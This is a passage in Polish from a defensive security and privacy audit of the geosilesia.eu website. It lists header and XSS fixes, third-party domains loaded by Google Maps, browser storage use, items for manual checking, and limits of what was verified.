`polityka-prywatnosci` na stagingu) już to opisuje: „wczytuje się z serwerów Google automatycznie po
otwarciu takiej strony”.

**Wpływ.** Zgodne z polityką; adres IP trafia do Google bez zgody.

**Poprawka (opcjonalna).** Placeholder „Pokaż mapę (Google Maps)” i ładowanie po kliknięciu,
z zapamiętaniem wyboru w sessionStorage. Lista miejsc działa bez mapy już dziś (`map.service.ts:48-52`).

### P2. Polityka prywatności nie opisuje zapisu w przeglądarce

**Dowód.** Serwis zapisuje w przeglądarce: IndexedDB `geosilesia` (cała treść stron i postów, ~2,4 MB,
`idb.service.ts:39`), Cache Storage `ngsw:*` (pliki aplikacji, obrazy z `/images`, fonty), sessionStorage
`scroll-positions` (`scroll-restoration.ts:8`). Brak cookies i localStorage. Tekst polityki na stagingu
nie wspomina IndexedDB ani pamięci przeglądarki (sprawdzone w bazie).

**Poprawka.** Dopisać akapit o danych zapisywanych na urządzeniu w celu działania offline
(niezbędne do świadczenia usługi, bez zgody, bez danych osobowych).

---

## 4. Quick wins

| Poprawka | Efekt | Nakład |
|---|---|---|
| B1 bez CSP: `x-powered-by` off + HSTS, nosniff, `X-Frame-Options`, `Referrer-Policy`, `Permissions-Policy`, CSP z `frame-ancestors`/`object-src`/`base-uri` | Zamyka SSL stripping, clickjacking, sniffing; ~10 linii w `app.js` | S |
| B2: usunąć `\| trusted` z szablonów | Koniec stored XSS z CMS (treści na stagingu przejdą przez sanitizer bez strat) | S–M |
| B3: nagłówki `nosniff` + `CSP sandbox` dla `/uploads` | SVG/HTML z uploadu nie uruchomią skryptu | S |
| B4: lista dozwolonych kadrów lub zaokrąglenie + limit kolejki | Brak prostego DoS na obrazach | S |
| D1: `SwUpdate.versionUpdates` + `unrecoverable` | Użytkownicy nie zostają na starej wersji po deployu | S |
| D2: zostawiać stare chunki w `deploy.sh` | Brak martwych sekcji po deployu | S |
| D4: `catchError` w resolverze | Nawigacja działa mimo błędów IndexedDB | S |
| D5: `start_url: "/"` | PWA startuje offline i z SSR | S |

---

## 5. Zewnętrzne zasoby

Fonty są lokalne. Nie ma analityki zewnętrznej, CDN-ów, cookies ani embedów wideo/audio
(YouTube, Facebook itp. występują tylko jako zwykłe linki). Statystyki liczy własny serwer (`visits.js`).

| Domena | Podstrony | Ładuje się bez akcji użytkownika? | Pewność |
|---|---|---|---|
| `maps.googleapis.com` (skrypt Maps JS, kafelki, usługi) | `/mapa-atrakcji` | **Tak** — po wejściu (pełne wejście: gdy wiersz mapy wejdzie w widok; nawigacja w aplikacji: od razu) | potwierdzone w kodzie |
| `maps.gstatic.com` (grafiki i zasoby mapy) | `/mapa-atrakcji` | **Tak**, ładowane przez skrypt Map | prawdopodobne (nie sprawdzone w ruchu sieciowym) |
| `fonts.googleapis.com`, `fonts.gstatic.com` (font Roboto/Google Sans dla kontrolek mapy) | `/mapa-atrakcji` | **Tak**, ładowane przez skrypt Map | prawdopodobne (do potwierdzenia w DevTools → Network) |
| `maps.googleapis.com` (Geocoding: wpisany adres) | `/mapa-atrakcji` | Nie — po wpisaniu adresu w wyszukiwarkę | potwierdzone |
| `www.google.com/maps/dir` | `/mapa-atrakcji` | Nie — link „Dojazd” | potwierdzone |
| ~150 domen w linkach (m.in. `pgi.gov.pl`, `youtube.com`, `facebook.com`, `wikipedia.org`, `ihpan.edu.pl`, `orsip.pl`) | markery mapy, „Do posłuchania”/„Do pooglądania”/…, wydarzenia, TOP 50 | Nie — tylko linki `rel="noreferrer"` | potwierdzone (skan bazy stagingu) |

**Zapis w przeglądarce:** IndexedDB `geosilesia` (strony, posty), Cache Storage `ngsw:*`,
sessionStorage `scroll-positions`. Usuwanie starych cache spoza ngsw: `app.ts:121-136`.

**Po stronie serwera:** `visits` i `visit_events` w Mongo — skrót SHA-256 z dziennej soli, adresu
sieci (IPv4 lub prefiks /64), User-Agenta i języka; IP i UA nie są zapisywane (`visits.js:280-291`).
To dane pseudonimizowane, polityka to opisuje.

---

## 6. Do ręcznego sprawdzenia

1. **Nagłówki ustawiane przez nginx/MyDevil.** Na produkcji ich nie ma, ale warto sprawdzić, czy panel
   MyDevil pozwala dodać HSTS na poziomie nginx (wtedy działa też dla odpowiedzi 301 z http).
2. **Staging: nagłówki i `robots.txt`** — nie znam adresu stagingu. Sprawdzić `curl -D - https://<staging>/robots.txt`
   (oczekiwane `Disallow: /`) i nagłówek `X-Robots-Tag: noindex, nofollow`.
3. **`config.json` na produkcji:** musi mieć `"allowIndexing": true` i `siteUrl` (dziś tak jest —
   `robots.txt` ma `Allow: /`, canonical wskazuje `https://geosilesia.eu/`). Ryzyko odwrotne: utrata tego
   wpisu przy migracji serwera = wypadnięcie z Google.
4. **Typy plików przyjmowane przez upload w CMS (frodo)** — SVG, HTML, rozmiar, gdzie zapisuje (B3).
5. **Uprawnienia użytkownika Mongo** serwisu na produkcji (B8) i czy baza produkcyjna też trzyma `users`/`sessions`.
6. **Klucz Google Maps** (`map.config.ts:5`, także w historii gita) — ograniczenia w Google Cloud Console:
   referrer `geosilesia.eu/*` (+ staging) i tylko Maps JavaScript API + Geocoding API. Lokalnie mapa nie
   działa, więc ograniczenie domeny prawdopodobnie jest.
7. **Czy nginx serwuje coś z katalogu aplikacji bezpośrednio** (np. `public/` w MyDevil). `/.git/config` → 403,
   `/config.json` → 404 (sprawdzone), ale lista plików w katalogu domeny jest do przejrzenia.
8. **Logi Passengera/nginx** — czy logują IP i pełne adresy (polityka mówi, że dziennik serwera zapisuje IP).
9. **D5 i offline** — sprawdzić w prawdziwym Chrome (wbudowana przeglądarka aplikacji nie rejestruje SW).
10. **Rotacja `tmp/img-cache`** — czy MyDevil ma limit dysku i ile zajmuje cache dziś.

## 7. Czego nie udało się sprawdzić

- **Panel CMS (frodo)** — osobne repozytorium, poza zakresem. Uwierzytelnianie, upload i rate limiting
  CMS nie są ocenione.
- **Formularz kontaktowy** — nie istnieje (strona kontaktu tylko pokazuje i kopiuje adres e-mail,
  `contact.ts:25-32`), więc nie ma czego sprawdzać pod kątem spamu i header injection.
- **Ruch sieciowy w przeglądarce** — nie uruchamiałem strony w przeglądarce, bo każde wejście wysyła
  beacon `view` i zapisuje wizytę do bazy (staging lub produkcja). Domeny Google wczytywane przez Maps JS
  (poza `maps.googleapis.com`) opisuję z wiedzy o bibliotece — oznaczone „prawdopodobne”.
- **Core Web Vitals na żywo** — nie mierzyłem (pomiar wymaga przeglądarki, j.w.). Elementy LCP:
  na stronie głównej pierwszy slajd `homepage-banner` (`fetchpriority="high"`, `<picture>` z kadrem
  `hero-phone`), na podstronach `page-hero__image` (`fetchpriority="high"`). Obrazy poniżej mają
  `srcset` WebP i są wstrzymywane do namalowania hero (`photo-hold.ts`). Wcześniejszy audyt CWV
  (2026-10-27) już to poprawił; nie znalazłem nowych problemów w kodzie.
- **Testy jednostkowe i lint** — nie istnieją w projekcie.
- **Dane produkcyjne** — skany treści (embedy, domeny, atrybuty HTML) robiłem na bazie stagingu.
  Produkcja może mieć inne treści.
- **Hydratacja z parametrami adresu** (`/mapa-atrakcji?nazwa=…`, `/geosilesia-galeria?kategoria=…`) —
  serwer renderuje bez parametrów, klient z parametrami. Bloki `@if`/`@for` Angular zwykle uzgadnia bez błędu,
  ale nie potwierdziłem tego w konsoli (brak przeglądarki, j.w.).
